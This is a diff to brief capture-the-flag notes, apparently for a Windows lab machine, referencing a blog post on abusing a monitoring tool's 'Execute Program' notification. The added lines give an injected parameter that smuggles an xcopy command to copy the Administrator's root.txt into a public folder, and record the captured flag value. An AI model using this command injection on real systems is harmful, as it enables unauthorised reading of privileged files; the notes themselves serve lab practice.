@@ -108,11 +108,13 @@ ________________________________________________________________________________
 Using:
 https://www.codewatch.org/blog/?p=453
 
-Notofication --> Execute Program --> Demo outfile.ps1
+Devices/ Notification --> Execute Program --> Demo outfile.ps1
                  \/  \/  \/
-                 Parameter:
+                 Parameter: test.txt;xcopy /s C:\Users\Administrator\root.txt C:\Users\Public\
 
     -- 
+C:\Users\Administrator\root.txt
+C:\Users\Public\Documents\show.txt
 
-root.txt
+root.txt = "3018977fb944bf1878f75b879fba67cc"
 
